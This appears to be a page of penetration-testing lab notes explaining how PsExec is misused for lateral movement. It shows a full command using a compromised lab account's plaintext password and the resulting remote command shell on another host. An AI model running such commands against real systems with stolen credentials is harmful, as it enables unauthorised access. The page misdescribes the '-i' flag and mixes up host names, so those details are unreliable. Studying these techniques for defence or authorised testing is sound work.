---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PsExec

[`PsExec`](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is a very versatile tool that is part of the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) suite. It's intended to replace telnet-like applications and provide remote execution of processes on other systems through an interactive console. `PsExec` requires Administrator privileges (on the local machine) to run programs on remote computers. Non-admins will also be able to use PsExec locally, but there is not much you can do without admin privilege.

It is possible to misuse this tool for lateral movement, but three requisites must be met:

1. The user that authenticates to the target machine needs to be part of the Administrators local group
2. The `ADMIN$` share must be available on the remote machine
3. [File and Printer Sharing](https://www.majorgeeks.com/content/page/how\_to\_turn\_on\_or\_off\_file\_and\_printer\_sharing\_in\_windows\_10.html) has to be turned on

Luckily the last two requirements are often met as they are the default settings on modern Windows Server systems.

To execute the command remotely, `PsExec` performs the following tasks:

1. Writes `psexesvc.exe` into the `C:\Windows` directory
2. Creates and spawns a service on the remote host
3. Runs the requested program/command as a child process of `psexesvc.exe`

## Example Background

Assume the attacker has RDP access as the `offsec` user who is an Administrator on `CLIENT74`. Also assume the attacker can easily transfer a copy of `PsExec64.exe` to the compromised machine via HTTP or some other means.

Lastly recall that the attacker has access to the compromised `jen` account, the credentials to which were discovered in [this example](../authentication/attacking-ad-authentication/password-attacks.md). As discovered in [this example](wmi-winrs-and-winrm.md#example-background), `jen` is an Administrator on several machines including `CLIENT74`, `FILES04`.

## Launching A Session

To launch a session on a remote computer via `PsExec` the command structure is as follows:

```shell
PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

* `-i` specifies the path to the target (recall that the `ADMIN$` share must be available)
* `-u` specifies the user to connect as
* `-p` is the password
* The last piece is the command that is run on the target. In this instance a command prompt is launched with `cmd`

When run this immediately launches an interactive session:

```powershell
PS C:\Users\offsec> .\PsExec64.exe -i  \\client76 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.16299.1087]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
CLIENT76
```
